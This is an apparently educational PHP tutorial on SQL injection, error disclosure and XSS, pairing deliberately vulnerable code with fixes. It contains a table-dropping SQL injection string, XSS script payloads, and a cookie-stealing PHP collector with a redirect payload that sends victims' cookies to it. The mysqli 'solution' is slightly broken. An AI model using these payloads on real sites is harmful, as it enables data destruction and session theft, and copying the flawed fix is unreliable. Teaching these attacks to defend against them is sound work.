## SQL-Injection
### To proceed please navigate to the sql folder and import the sql file to phpmyadmin before accessing index.php

#### Problem: No Escape on Forms
* Let's assume that you create a simple form to take in user data.

``` PHP
<?php
$con = new PDO('mysql:host=localhost;dbname=sql_injection', 'root', ''); // connecting to db
//OR
$con = new mysqli("localhost", "root", "", "sql_injection");
?>

<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Document</title>
</head>

<body>
<form action="" method="post" autocomplete="off">
    <label for="name">
        Email
        <input type="text" name="email">
    </label>
    <input type="submit" >
</form>
</body>
</html>
```
* Then you decide to process the form like someone normally would.

``` PHP
<?php
$con = new PDO('mysql:host=localhost;dbname=sql_injection', 'root', ''); // connecting to db

// OR
$con = new mysqli("localhost", "root", "", "sql_injection");

// processing form input
if (isset($_POST['email']))
{
    $email = $_POST['email'];
    $query = $con->query("SELECT * FROM users WHERE email = '{$email}'");
    // for PDO
    if ($query->rowCount())
    {
        echo "found an email address!";    
    }

    // for MYSQL
    if ($query->num_rows)
    {
        echo "found an email address!";    
    }
}

?>
// ... hidden body of the form
```
* The code above can seem normal but it is in fact extremely flawed

#### If I was a hacker and I would write queries to test whether the developer made sure to escape the input provided by users.

* Examples of queries I can execute in the email input bar.

```
'; DROP TABLE posts; --'
/* translates to the following query:
"SELECT * FROM users WHERE email = ''; DROP TABLE posts; --'");
*/
```

#### Solution:

* Use prepare statements or escape each string input

``` PHP
<?php
// for PDO
$query = $con->prepare("SELECT * FROM users WHERE email = :email ");
$query->execute(array('email'=>$email));

// for MYSQL
$email = $mysqli->real_escape_string($email);
 $con->query("SELECT * FROM users WHERE email = '($email)'");
 ?>
```
#### Problem: Errors

* Might sound strange but fatal errors provide information about problems with code that can include sensitive information like the database name, password, username, etc.

* When you go live, make sure to turn PHP errors off. But in test environments errors are encouraged.

#### Solution:

* In php.ini file change the 'display-errors' value to off when in production.

``` PHP
<?php
// to check whether errors are enabled
phpinfo();

//remotely changing the settings

error_reporting(0);
ini_set('display_errors', 'Off');

?>
```  

#### Problem: XSS (Cross-Site Scripting)

* Definition: Cross-site scripting, also known as XSS, is a type of computer security vulnerability typically found in web applications. XSS enables attackers to inject client-side scripts into web pages viewed by other users.

* Let's assume that we have a comments section in our application (index.php under xss folder). Even though we made sure to be sql-injection safe, we are not safe from malicious xss attacks.

    * I can put the `<script>` tags into the comment section:

    ``` JS
    <script>alert("i just got in by injecting this js script tag!! hahhahaha");</script>
    ```

    * If the developer then tried to show this data, in most crud system that is the case, then the javascript will execute on reload.

#### Solution:
* Simply employ the htmlspecialchars method on the post body to prevent injecting js into the database

``` PHP
$body =  htmlspecialchars($_POST['body'], ENT_QUOTES);
```
#### Problem: Stealing Cookies
* Assume that the htmlspecialchars method is not used and XSS problem still exists.
* A more damaging attack would be to redirect any user to a php file that steals cookies

* hacker file that was created to steal cookies

``` PHP
<?php
$cookie = $_GET['cookie'];
file_put_contents('mycookies.text', $cookie);
?>
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Document</title>
</head>
<body>


    <h1>Page not working</h1>


</body>
</html>
```
* If the hacker was to write the following the comment section and submit it to the database then each user accessing the comment section would be redirected to the file that steals their cookies

``` HTML
You are getting redirected and hacked!
<script>
window.location =
 'http://localhost/security/xss/hacker.php?cookie='+escape(document.cookie);
</script>
```
